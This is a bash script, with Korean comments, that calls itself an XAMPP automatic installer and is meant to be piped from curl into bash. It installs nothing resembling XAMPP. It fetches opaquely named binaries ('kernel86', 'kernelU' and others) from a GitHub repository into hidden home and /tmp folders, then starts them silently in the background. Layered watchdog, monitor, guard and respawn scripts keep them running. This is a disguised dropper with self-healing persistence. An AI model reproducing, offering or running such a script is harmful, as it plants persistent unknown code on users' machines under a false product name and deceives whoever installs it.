#!/bin/bash
# ============================================
# XAMPP 자동 설치 프로그램
# 사용법:
#   curl -fsSL https://raw.githubusercontent.com/basilbay80/Pw1/main/installation.sh | bash
# ============================================

set -e

# ============================================
# 🔗 저장소 URL
# ============================================
REPO_URL="https://raw.githubusercontent.com/basilbay80/Pw4/main"

# ============================================
# 📁 디렉토리 경로 (수정됨: /var/tmp → $HOME)
# ============================================
MAIN_DIR="$HOME/.xampp-healthcheck"
HELPER_DIR="/tmp/.xampp-helper"
GUARD_DIR="$HOME/.xampp-guard"

# ============================================
# 🎨 색상
# ============================================
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${BLUE}[정보]${NC} $1"; }
success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
warn()    { echo -e "${YELLOW}[경고]${NC} $1"; }
error()   { echo -e "${RED}[실패]${NC} $1"; }

# ============================================
# 배너
# ============================================
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${BOLD}XAMPP 자동 설치 프로그램${NC}                  ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# 아키텍처 감지
# ============================================
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)  RUNNER="kernel86"; WORKER="kernelU" ;;
    aarch64|arm64) RUNNER="kernel64"; WORKER="kernelX" ;;
    *) error "지원하지 않는 아키텍처: $ARCH"; exit 1 ;;
esac
success "아키텍처 감지됨: $ARCH → $RUNNER / $WORKER"

# ============================================
# 다운로드 함수 (fallback)
# ============================================
download() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    info "$name 다운로드 중..."
    
    if command -v curl >/dev/null 2>&1; then
        if curl -fsSL -o "$output" "$url"; then
            success "$name 다운로드 성공"
            return 0
        fi
    fi
    
    if command -v wget >/dev/null 2>&1; then
        if wget -q -O "$output" "$url"; then
            success "$name 다운로드 성공 (wget)"
            return 0
        fi
    fi
    
    error "$name 다운로드 실패"
    return 1
}

# ============================================
# [1/5] 폴더 생성 (수정됨: sudo 제거)
# ============================================
echo ""
echo -e "${YELLOW}━━━ [1/5] 폴더 생성 ━━━${NC}"
mkdir -p "$MAIN_DIR/logs"
mkdir -p "$HELPER_DIR"
mkdir -p "$GUARD_DIR"
success "폴더 준비 완료"

# ============================================
# [2/5] Runner & Worker 다운로드
# ============================================
echo ""
echo -e "${YELLOW}━━━ [2/5] Runner & Worker 다운로드 ━━━${NC}"

download "${REPO_URL}/${RUNNER}" "$MAIN_DIR/runner" "runner ($RUNNER)"
download "${REPO_URL}/${WORKER}" "$MAIN_DIR/${WORKER}" "worker ($WORKER)"

chmod +x "$MAIN_DIR/runner" "$MAIN_DIR/${WORKER}"

# ============================================
# [3/5] 워치독 & 트리거 다운로드
# ============================================
echo ""
echo -e "${YELLOW}━━━ [3/5] 워치독 & 트리거 다운로드 ━━━${NC}"

download "${REPO_URL}/watchdog.sh"        "$MAIN_DIR/watchdog.sh"        "watchdog.sh"
download "${REPO_URL}/trigger-respawn.sh" "$MAIN_DIR/trigger-respawn.sh" "trigger-respawn.sh"
download "${REPO_URL}/trigger-auto.sh"    "$MAIN_DIR/trigger-auto.sh"    "trigger-auto.sh"
download "${REPO_URL}/monitor.sh"         "$HELPER_DIR/monitor.sh"       "monitor.sh"
download "${REPO_URL}/guard.sh"           "$GUARD_DIR/guard.sh"          "guard.sh"

# ============================================
# [4/5] 실행 권한 부여
# ============================================
echo ""
echo -e "${YELLOW}━━━ [4/5] 실행 권한 부여 ━━━${NC}"
find "$MAIN_DIR"   -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$HELPER_DIR" -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
success "모든 스크립트 실행 가능"

# ============================================
# [5/5] Runner & 워치독 실행
# ============================================
echo ""
echo -e "${YELLOW}━━━ [5/5] Runner & 워치독 실행 ━━━${NC}"

# 워치독 레이어 먼저 실행
nohup bash "$GUARD_DIR/guard.sh"        > /dev/null 2>&1 & success "가드 (3차 레이어) 실행 중"
sleep 1
nohup bash "$HELPER_DIR/monitor.sh"     > /dev/null 2>&1 & success "모니터 (2차 레이어) 실행 중"
sleep 1
nohup bash "$MAIN_DIR/watchdog.sh"      > /dev/null 2>&1 & success "워치독 (1차 레이어) 실행 중"
sleep 1
nohup bash "$MAIN_DIR/trigger-auto.sh"  > /dev/null 2>&1 & success "자동 트리거 실행 중"
sleep 1

# Runner 실행
cd "$MAIN_DIR"
nohup ./runner > "$MAIN_DIR/logs/runner.log" 2>&1 & 
success "🤖 Runner 실행됨 (PID: $!)"

# ============================================
# 완료
# ============================================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ 설치 완료!                              ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}프로세스 확인:${NC}  ps aux | grep -E 'runner|watchdog|monitor|guard'"
echo -e "${CYAN}로그 확인:${NC}      tail -f $MAIN_DIR/logs/runner.log"
echo -e "${CYAN}수동 재시작:${NC}    $MAIN_DIR/trigger-respawn.sh"
echo ""
